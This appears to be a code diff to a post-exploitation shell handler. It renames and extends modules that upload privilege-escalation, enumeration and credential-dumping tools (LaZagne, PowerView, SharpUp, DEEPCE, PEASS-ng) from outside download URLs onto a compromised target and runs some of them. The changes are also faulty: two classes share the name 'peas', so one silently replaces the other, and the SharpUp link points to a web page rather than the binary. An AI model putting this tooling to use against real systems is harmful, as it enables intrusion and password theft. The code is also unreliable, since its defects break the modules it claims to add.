@@ -3632,21 +3632,33 @@ class Module:
 	def post_upgrade(self):
 		pass
 
-class upload_privesc_scripts(Module):
+class privesc(Module):
 	description = 'Upload privilege escalation scripts to the target'
 	def run(self):
 		if self.session.OS == 'Unix':
 			self.session.upload(BINARIES['linpeas'])
 			self.session.upload(BINARIES['lse'])
+			self.session.upload(BINARIES['deepce'])
 		elif self.session.OS == 'Windows':
 			self.session.upload(BINARIES['winpeas'])
 			self.session.upload(BINARIES['powerup'])
+			self.session.upload(BINARIES['sharpup'])
+			self.session.upload(BINARIES['lazagne'])
+			self.session.upload(BINARIES['powerview'])
 
-class peass_ng(Module):
+class peas(Module):
 	description = 'Run the latest version of PEASS-ng in the background'
 	def run(self):
 		if self.session.OS == 'Unix':
 			self.session.script(BINARIES['linpeas'])
+		elif self.session.OS == 'Windows':
+			logger.error("This module runs only in Unix shells")
+
+class peas(Module):
+	description = 'Run the latest version of DEEPCE in the background'
+	def run(self):
+		if self.session.OS == 'Unix':
+			self.session.script(BINARIES['deepce'])
 		elif self.session.OS == 'Windows':
 			logger.error("This module runs only in Unix shells")
 
@@ -4268,10 +4280,14 @@ BINARIES = {
 	'socat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat",
 	'ncat': "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat",
 	'linpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
-	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
+	'winpeas': "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe",
 	'lse': "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
 	'powerup': "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
-	'ngrok_linux': "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
+	'sharpup': "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe",
+	'ngrok_linux': "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
+	'deepce': "https://github.com/stealthcopter/deepce/raw/refs/heads/main/deepce.sh",
+	'lazagne': "https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe",
+	'powerview': "https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1" 
 }
 
 # INITIALIZATION
